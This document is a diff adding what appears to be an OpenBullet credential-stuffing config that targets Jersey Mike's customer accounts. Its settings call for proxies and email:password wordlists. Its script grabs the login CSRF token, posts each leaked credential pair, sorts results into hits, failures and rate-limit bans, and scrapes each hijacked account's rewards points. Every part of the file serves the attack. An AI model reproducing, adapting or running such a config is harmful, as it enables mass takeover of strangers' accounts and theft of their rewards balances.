@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "JerseyMikes",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-26T01:37:53.3660288+02:00",
+  "AdditionalInfo": "",
+  "Author": "Relent",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "newuser" 
+
+REQUEST GET "https://www.jerseymikes.com/" 
+  
+  HEADER "Host: www.jerseymikes.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: nb-NO,nb;q=0.9,no-NO;q=0.8,no;q=0.6,nn-NO;q=0.5,nn;q=0.4,en-US;q=0.3,en;q=0.1" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" CSS "[name=\"_token\"]" "value" -> VAR "token" 
+
+REQUEST POST "https://www.jerseymikes.com/account/login" 
+  CONTENT "_token=<token>&email=<newuser>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.jerseymikes.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "DNT: 1" 
+  HEADER "Referer: https://www.jerseymikes.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your email and password do not match any account for this country." 
+  KEYCHAIN Success OR 
+    KEY "aria-hidden=\"true\"></i> Log Out</a>" 
+  KEYCHAIN Ban OR 
+    KEY "Too Many Attempts." 
+
+REQUEST GET "https://www.jerseymikes.com/account" 
+  
+  HEADER "Host: www.jerseymikes.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "DNT: 1" 
+  HEADER "Referer: https://www.jerseymikes.com/account" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "<a href=\"https://www.jerseymikes.com/account/rewards\" " "<a href=\"https://www.jerseymikes.com/account\" class=\"pure-u-1 pad smaller\">View My Account</a>" -> VAR "cap1" 
+
+PARSE "<cap1>" LR "<div><strong>" "</strong></div>" -> VAR "cap2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<cap2>" Contains "Points" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<cap2>" Contains "Start Order" 
+
+PARSE "<cap1>" LR "<div><strong>" "</strong></div>" -> CAP "Amount" 
+
